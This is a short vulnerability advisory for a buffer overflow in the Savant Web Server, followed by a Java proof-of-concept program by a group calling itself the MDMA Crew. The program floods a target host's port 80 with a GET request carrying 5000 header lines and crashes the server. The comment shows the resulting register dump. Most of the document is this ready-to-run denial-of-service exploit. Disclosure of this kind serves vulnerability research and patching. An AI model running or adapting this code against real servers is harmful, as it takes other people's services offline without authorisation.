source: http://www.securityfocus.com/bid/1453/info

A buffer overflow exists in the Savant Web Server. It is possible to exploit this overflow by sending an unusually long GET request to the server.


/* The MDMA Crew's proof-of-concept code for the buffer overflow in Savant
 * Written by Wizdumb <wizdumb@leet.org || www.mdma.za.net/fk>
 *
 * The overflow occurs when the server recieves too many headers in the GET
 * request. The results of the attack look something like...
 *
 * SAVANT caused an invalid page fault
 * in module KERNEL32.DLL at 015f:bff87eb5.
 *
 * Registers:
 *
 * EAX=c00300ec CS=015f EIP=bff87eb5 EFLGS=00010212
 * EBX=0119ff90 SS=0167 ESP=0109ffc4 EBP=010a0030
 * ECX=010a01e4 DS=0167 ESI=8162f198 FS=20f7
 * EDX=bff76859 ES=0167 EDI=010a020c GS=0000
 *
 * Bytes at CS:EIP:
 * 53 56 57 8b 30 83 7d 10 01 8b 4e 38 89 4d f8 75
 *
 * Stack dump:
 *
 * Enjoy!
 * Andrew Lewis aka. Wizdumb [03/07/2000]
 */

import java.io.*;
import java.net.*;

class savantstack {

 public static void main(String[] args) throws IOException {
   
   if (args.length != 1) {
     System.out.println("Syntax: java savantstack [hostname/ip]");
     System.exit(1); }
   
   Socket soq = null;
   PrintWriter white = null;
   
   int i = 5000; // This should do fine :-)
   
   soq = new Socket(args[0], 80);
   white = new PrintWriter(soq.getOutputStream(), true);
   
   System.out.print("Showing " + args[0] + " the phj33r :P ...");
   white.print("GET /index.html HTTP/1.0");
   for (int x = 0; x < i; x++) white.println("A:A");
   white.println("\n");
   System.out.println("Done!");
   
   white.close();
   soq.close(); } }